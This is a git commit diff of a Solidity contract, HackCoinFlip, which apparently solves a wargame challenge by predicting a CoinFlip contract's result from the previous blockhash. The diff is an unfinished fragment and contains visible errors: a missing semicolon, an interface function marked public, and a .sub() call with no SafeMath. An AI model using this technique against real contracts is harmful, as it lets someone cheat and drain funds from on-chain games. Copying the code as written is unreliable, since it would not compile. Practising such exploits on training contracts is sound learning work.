9af3673cde3a5a06bbafa3de6b96709ab91a1c86
John Matthews <JMMatthews@Protonmail.com>
2022-01-20 23:05:09 -0600

    Remove CoinFlip inheritance and add vital variables

--- contracts/HackCoinFlip.sol
+++ contracts/HackCoinFlip.sol
@@ -1,10 +1,18 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "./CoinFlip.sol";
+interface ICoinFlip {
+  function flip(bool _guess) public returns (bool);
+}
 
-contract HackCoinFlip is CoinFlip {
+contract HackCoinFlip {
     bool public side;
+    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    address coinFlip;
+
+    constructor(address _coinFlip) public {
+      coinFlip = _coinFlip
+    }
 
     function hack() public {
         uint256 blockValue = uint256(blockhash(block.number.sub(1)));
